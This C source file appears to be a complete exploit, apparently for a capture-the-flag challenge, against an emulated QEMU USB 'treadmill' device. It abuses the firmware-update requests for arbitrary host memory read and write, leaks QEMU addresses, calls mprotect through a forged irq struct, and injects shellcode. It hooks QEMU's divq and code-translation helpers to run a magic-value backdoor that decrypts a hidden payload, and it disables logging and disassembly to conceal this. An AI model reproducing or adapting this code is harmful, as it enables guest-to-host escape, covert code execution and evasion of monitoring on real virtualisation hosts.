#include <assert.h>
#include <limits.h>
#include <pthread.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <libusb-1.0/libusb.h>
#include <sys/mman.h>

#include "offsets.h"
#include "stuff.h"
#include "payload.h"

#define TREADMILL_IN_EP 1
#define TREADMILL_OUT_EP 2

#define TREADMILL_IN_ADDR (1 | 0x80)
#define TREADMILL_OUT_ADDR 2

#define TREADMILL_RESET 0
#define TREADMILL_BEGIN_UPDATE 1
#define TREADMILL_SEEK_UPDATE 2
#define TREADMILL_COMMIT_UPDATE 3

#define BACKDOOR_MAGIC_ON 0x8e2d272b77f1a86a
#define BACKDOOR_MAGIC_OFF 0xcbf0f8132885648f

#define KEY1 0xb7da92e68673dbaa
#define KEY2 0x817658c1e735bc9b

#define CF_NOIRQ         0x00010000 /* Generate an uninterruptible TB */

#define VendorDeviceRequest (LIBUSB_ENDPOINT_IN|LIBUSB_REQUEST_TYPE_VENDOR|LIBUSB_RECIPIENT_DEVICE)

#if false
#define FPRINTF_DEBUG(...) (fprintf(__VA_ARGS__))
#define PRINTF_DEBUG(...) (printf(__VA_ARGS__))
#else
#define FPRINTF_DEBUG(...) do {} while (0)
#define PRINTF_DEBUG(...) do {} while (0)
#endif

int set_offset(libusb_device_handle *handle, int64_t offset) {
    int r;

    //assert(offset <= SHRT_MAX);
    //assert(offset >= SHRT_MIN);

    // reset device
    r = libusb_control_transfer(handle, VendorDeviceRequest, TREADMILL_RESET, 0, 0, NULL, 0, 100);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error on reset: %s\n", libusb_error_name(r));
        return r;
    }

    // set firmware size
    r = libusb_control_transfer(handle, VendorDeviceRequest, TREADMILL_BEGIN_UPDATE, 8192, 0, NULL, 0, 100);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error on begin update: %s\n", libusb_error_name(r));
        return r;
    }

    // set offset
    r = libusb_control_transfer(handle, VendorDeviceRequest, TREADMILL_SEEK_UPDATE, offset, 0, NULL, 0, 100);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error on seek update: %s\n", libusb_error_name(r));
        return r;
    }

    return LIBUSB_SUCCESS;
}

int set_ptr(libusb_device_handle *handle, uint64_t addr) {
    int r;

    // set offset to fw_ptr
    r = set_offset(handle, OFFSET_FW_PTR - OFFSET_FW_BUF);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error on set_offset in set_ptr: %s\n", libusb_error_name(r));
        return r;
    }

    // overwrite fw_ptr + overwrite fw_size to be very large
    // must subtract sizeof(data) because it is added to fw_ptr during the write
    uint64_t data[2] = {addr - sizeof(data), INT64_MAX};
    int out_len;
    r = libusb_bulk_transfer(handle, TREADMILL_OUT_ADDR, (unsigned char*)&data, sizeof(data), &out_len, 100);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error overwriting pointer: %s\n", libusb_error_name(r));
        return r;
    }

    if (out_len != sizeof(data)) {
        FPRINTF_DEBUG(stderr, "set_ptr: wrote only %d bytes\n", out_len);
        return -1;
    }

    return LIBUSB_SUCCESS;
}

int rel_read(libusb_device_handle *handle, int64_t offset, void *data, uint64_t len) {
    int r;

    // set offset
    r = set_offset(handle, offset);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error on set_offset in rel_read: %s\n", libusb_error_name(r));
        return r;
    }

    int out_len;
    r = libusb_bulk_transfer(handle, TREADMILL_IN_ADDR, data, len, &out_len, 1000);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error reading data: %s\n", libusb_error_name(r));
        return r;
    }

    if (out_len != len) {
		FPRINTF_DEBUG(stderr, "didn't read all bytes %d/%lu\n", out_len, len);
        return -1;
    }

    return LIBUSB_SUCCESS;
}

int rel_write(libusb_device_handle *handle, int64_t offset, void *data, uint64_t len) {
    int r;

    // set offset
    r = set_offset(handle, offset);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error on set_offset in rel_write: %s\n", libusb_error_name(r));
        return r;
    }

    int out_len;
    r = libusb_bulk_transfer(handle, TREADMILL_OUT_ADDR, data, len, &out_len, 1000);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error writing data: %s\n", libusb_error_name(r));
        return r;
    }

    if (out_len != len) {
		FPRINTF_DEBUG(stderr, "didn't write all bytes %d/%lu\n", out_len, len);
        return -1;
    }

    return LIBUSB_SUCCESS;
}

int arb_read(libusb_device_handle *handle, uint64_t addr, void *data, uint64_t len) {
    int r;

    r = set_ptr(handle, addr);
    if (r != 0) {
        FPRINTF_DEBUG(stderr, "error during set_ptr in arb_read\n");
        return r;
    }

    int out_len;
    r = libusb_bulk_transfer(handle, TREADMILL_IN_ADDR, data, len, &out_len, 1000);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error reading data: %s\n", libusb_error_name(r));
        return r;
    }

    if (out_len != len) {
		FPRINTF_DEBUG(stderr, "didn't read all bytes %d/%lu\n", out_len, len);
        return -1;
    }

    return LIBUSB_SUCCESS;
}

int arb_write(libusb_device_handle *handle, uint64_t addr, void *data, uint64_t len) {
    int r;

    r = set_ptr(handle, addr);
    if (r != 0) {
        FPRINTF_DEBUG(stderr, "error during set_ptr in arb_write\n");
        return r;
    }

    int out_len;
    r = libusb_bulk_transfer(handle, TREADMILL_OUT_ADDR, data, len, &out_len, 1000);
    if (r != 0) {
		FPRINTF_DEBUG(stderr, "error writing data: %s\n", libusb_error_name(r));
        return r;
    }

    if (out_len != len) {
		FPRINTF_DEBUG(stderr, "didn't write all bytes %d/%lu\n", out_len, len);
        return -1;
    }

    return LIBUSB_SUCCESS;
}

void arb_read_c(libusb_device_handle *handle, uint64_t addr, void *data, uint64_t len) {
    if (arb_read(handle, addr, data, len) != LIBUSB_SUCCESS) {
        abort();
    }
}

void arb_write_c(libusb_device_handle *handle, uint64_t addr, void *data, uint64_t len) {
    if (arb_write(handle, addr, data, len) != LIBUSB_SUCCESS) {
        abort();
    }
}

uint64_t arb_read_u64(libusb_device_handle *handle, uint64_t addr) {
    uint64_t value;
    arb_read_c(handle, addr, &value, sizeof(value));
    return value;
}

void do_mprotect(libusb_device_handle *handle, uint64_t dev_base, uint64_t dev_class, uint64_t qemu_base, uint64_t addr, uint64_t len, int prot) {
    int r;
    uint64_t handle_reset = dev_class + OFFSET_HANDLE_RESET;
    uint64_t qemu_set_irq = qemu_base + FUNCTION_QEMU_SET_IRQ;
    uint64_t _mprotect = qemu_base + FUNCTION_MPROTECT;

    // use this function to get control over arguments
    // void qemu_set_irq(qemu_irq irq, int level)
    // {
    //     if (!irq)
    //         return;
    //
    //     irq->handler(irq->opaque, irq->n, level);
    // }

    // handle_reset is called with the usb device as first argument
    // overlay it with a fake qemu_irq struct to get full control over the first argument
    struct {
        uint64_t handler;
        uint64_t opaque;
        int n;
    } fake_irq = {
        qemu_set_irq,
        dev_base+OFFSET_FW_BUF,
        prot,
    };
    arb_write_c(handle, dev_base+OFFSET_HANDLER, &fake_irq, sizeof(fake_irq));

    // call qemu_set_irq again to get control over all three arguments required for mprotect
    fake_irq.handler = _mprotect;
    fake_irq.opaque = addr;
    fake_irq.n = len;
    rel_write(handle, OFFSET_HANDLER, &fake_irq, sizeof(fake_irq));

    // overwrite the reset handler
    arb_write_c(handle, handle_reset, (void*)&qemu_set_irq, 8);
    PRINTF_DEBUG("overwrite handle_reset success\n");
    // call reset to trigger the exploit
    r = libusb_reset_device(handle);
}

typedef void (*DIVQ)(void*, uint64_t);
void divq_wrapper(void *env, uint64_t t0) {
    // this function wraps the divq_EAX helper and is used to activate the backdoor
    DIVQ divq = (DIVQ)*((uint64_t*)&divq_wrapper-1);

    uint64_t *regs = (uint64_t*)(((uint8_t*)env)+OFFSET_REGS);
    uint32_t *hflags = (uint32_t*)(((uint8_t*)env)+OFFSET_HFLAGS);
    uint32_t *hflags2 = (uint32_t*)(((uint8_t*)env)+OFFSET_HFLAGS2);
    void *cpu = (uint64_t*)(((uint8_t*)env)-SIZEOF_CPUSTATE);
    uint32_t *cflags_next_tb = (uint32_t*)(((uint8_t*)cpu)+OFFSET_CFLAGS_NEXT_TB);

    if (regs[R_R10] == BACKDOOR_MAGIC_ON) {
        // activating the backdoor
        // set an unused hflag
        *hflags |= 1 << 30;
        // disable interrupts to prevent context switching
        *hflags2 &= ~1u;
    } else if (regs[R_R10] == BACKDOOR_MAGIC_OFF) {
        *hflags &= ~(1 << 30);
    }

    // call original divq
    divq(env, t0);
}

inline uint8_t gen_key(uint64_t key1, uint64_t key2, uint64_t offset) {
    uint8_t x = key1 >> (offset & 0x3F);
    return x ^ (key2 >> (offset >> 6));
}

typedef uint64_t (*LD)(void*, void*, void*, uint64_t, uint64_t);
uint64_t translator_ld_wrapper(void* env, void* db, void* dest, uint64_t pc, uint64_t len) {
    // this function is used by QEMU to load code bytes during translation
    // it is modified to decrypt the actual malware code
    LD ld = (LD)((uint8_t*)&translator_ld_wrapper-0x100);
    uint32_t *hflags = (uint32_t*)(((uint8_t*)env)+OFFSET_HFLAGS);
    uint32_t *hflags2 = (uint32_t*)(((uint8_t*)env)+OFFSET_HFLAGS2);
    uint8_t *cpl = (((uint8_t*)db)+OFFSET_CPL);

    if (*cpl != 3) {
        // we are no longer in usermode, likely due to a syscall
        if (*hflags & (1 << 30)) {
            // the backdore is active, turn it off to prevent the kernel from crashing
            *hflags &= ~(1 << 30);
            // enable interrupts again
            *hflags2 |= 1u;
        }
    }

    if (*hflags & (1 << 30)) {
        // apply an offset to the load address
        pc -= OFFSET;
        // keep interrupts disabled
        *hflags2 &= ~1u;
    }

    // load the actual value
    uint64_t res = ld(env, db, dest, pc, len);

    if (*hflags & (1 << 30)) {
        // decrypt the value
        for (int i = 0; i < len; i++) {
            ((uint8_t*)dest)[i] ^= gen_key(KEY1, KEY2, (pc+i)&0xFFF);
        }
    }
    return res;
}

extern void payload(void);
__asm__ (
    ".pushsection .text\n"
    ".p2align 12\n"
    ".global payload\n"
    ".set payload, (. + " STRINGIFY(OFFSET) ")\n"
    ".incbin \"payload.bin\"\n"
    ".popsection\n"
);

int main(void) {
	int ret = 0;

	libusb_init(NULL);

    libusb_device_handle *handle = libusb_open_device_with_vid_pid(NULL, 0x1337, 0x1337);
    if (!handle) {
		FPRINTF_DEBUG(stderr, "Treadmill not connected!\n");
		ret = 2;
		goto cleanup;
    }

	libusb_device *device = libusb_get_device(handle);

    struct libusb_config_descriptor *config;
    int r = libusb_get_active_config_descriptor(device, &config);
    if (r < 0) {
        FPRINTF_DEBUG(stderr, "Cannot retrieve config descriptor: %s\n", libusb_error_name(r));
        ret = 3;
        goto cleanup;
    }
    const struct libusb_interface *itf = &config->interface[0];
    const struct libusb_interface_descriptor *itf_desc = &itf->altsetting[0];
    const struct libusb_endpoint_descriptor *ep_desc = &itf_desc->endpoint[1];
    uint8_t interface = itf_desc->bInterfaceNumber;
    uint8_t endpoint = ep_desc->bEndpointAddress;
    uint16_t max_packet_size = ep_desc->wMaxPacketSize;
    libusb_free_config_descriptor(config);

	r = libusb_set_auto_detach_kernel_driver(handle, 1);
	if (r != LIBUSB_SUCCESS) {
		FPRINTF_DEBUG(stderr, "Cannot set auto-detach kernel driver: %s\n", libusb_error_name(r));
		ret = 4;
		goto cleanup;
	}

	r = libusb_claim_interface(handle, interface);
	if (r != LIBUSB_SUCCESS) {
		FPRINTF_DEBUG(stderr, "Cannot claim interface: %s\n", libusb_error_name(r));
		ret = 5;
		goto cleanup;
	}

    // leak address of device struct from fw_ptr
    uint64_t fw_ptr_addr;
    r = rel_read(handle, OFFSET_FW_PTR - OFFSET_FW_BUF, &fw_ptr_addr, sizeof(fw_ptr_addr));
	if (r != LIBUSB_SUCCESS) {
		FPRINTF_DEBUG(stderr, "Error leaking fw_buf_addr: %s\n", libusb_error_name(r));
		ret = 6;
		goto cleanup;
	}
    PRINTF_DEBUG("fw_ptr_addr: 0x%lx\n", fw_ptr_addr);

    // calc device base and read pointer to class struct
    uint64_t dev_base = fw_ptr_addr - OFFSET_FW_PTR;
    PRINTF_DEBUG("dev_base: 0x%lx\n", dev_base);
    uint64_t dev_class = arb_read_u64(handle, dev_base);
    PRINTF_DEBUG("dev_class: 0x%lx\n", dev_class);

    // leak qemu base via function pointer
    uint64_t handle_control = dev_class + OFFSET_HANDLE_CONTROL;
    PRINTF_DEBUG("handle_control: 0x%lx\n", handle_control);

    uint64_t treadmill_handle_control = arb_read_u64(handle, handle_control);
    uint64_t qemu_base = treadmill_handle_control - FUNCTION_USB_TREADMILL_HANDLE_CONTROL;
    PRINTF_DEBUG("qemu_base: 0x%lx\n", qemu_base);

    // make fw_buf executable
    do_mprotect(handle, dev_base, dev_class, qemu_base, (dev_base+OFFSET_FW_BUF) & ~0xFFF, 0x4000, 7);

    // write addr and shellcode to fw_buf
    uint64_t divq_addr = qemu_base+FUNCTION_HELPER_DIVQ_EAX;
    rel_write(handle, 0x100-sizeof(uint64_t), &divq_addr, sizeof(divq_addr));
    rel_write(handle, 0x100, &divq_wrapper, 0x100);

    // redirect execution to shellcode if divq is used
    uint64_t divq_wrapper_addr = dev_base + OFFSET_FW_BUF + 0x100;
    arb_write_c(handle, qemu_base+FUNCTION_HELPER_INFO_DIVQ_EAX, &divq_wrapper_addr, sizeof(divq_wrapper_addr));

    // nop logging
    const uint64_t tcg_dump_ops = qemu_base + FUNCTION_TCG_DUMP_OPS;
    do_mprotect(handle, dev_base, dev_class, qemu_base, tcg_dump_ops & ~0xFFF, 0x2000, 7);
    arb_write_c(handle, tcg_dump_ops, (void*)"\xc3", 1);
    const uint64_t disas = qemu_base + FUNCTION_DISAS;
    do_mprotect(handle, dev_base, dev_class, qemu_base, disas & ~0xFFF, 0x2000, 7);
    arb_write_c(handle, disas, (void*)"\xc3", 1);

    // make translator_ld patchable
    const uint64_t translator_ld = qemu_base + FUNCTION_TRANSLATOR_LD;
    do_mprotect(handle, dev_base, dev_class, qemu_base, translator_ld & ~0xFFF, 0x2000, 7);

    uint8_t shellcode[] = {
        0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x53, 0x4c, 0x89, 0xc3, // code from translator_ld
        0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, const
        0xff, 0xe0, // jmp rax
    };

    // copy addr of resume point in translator_ld into the shellcode
    uint64_t translator_ld_resume = translator_ld + 13;
    memcpy(shellcode + 13 + 2, &translator_ld_resume, sizeof(translator_ld_resume));
    // write shellcode to fw_buf
    rel_write(handle, 0x200, shellcode, sizeof(shellcode));

    // write translator_ld_wrapper to fw_buf
    uint64_t printf_addr = qemu_base + FUNCTION___PRINTF_CHK;
    rel_write(handle, 0x300-sizeof(uint64_t), &printf_addr, sizeof(printf_addr));
    rel_write(handle, 0x300, &translator_ld_wrapper, 0x300);

    // create trampoline for translator_ld
    uint8_t trampoline[] = {
        0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, const
        0xff, 0xe0, // jmp rax
    };
    // write address of translator_ld_wrapper into trampoline code
    uint64_t translator_ld_wrapper_addr = dev_base + OFFSET_FW_BUF + 0x300;
    memcpy(trampoline + 2, &translator_ld_wrapper_addr, sizeof(dev_base));
    // write trampoline to translator_ld
    arb_write_c(handle, translator_ld, trampoline, sizeof(trampoline));

    libusb_close(handle);
    PRINTF_DEBUG("After close\n");

    // call payload in payload.S
    payload();

    return ret;
cleanup:
	return ret;
}
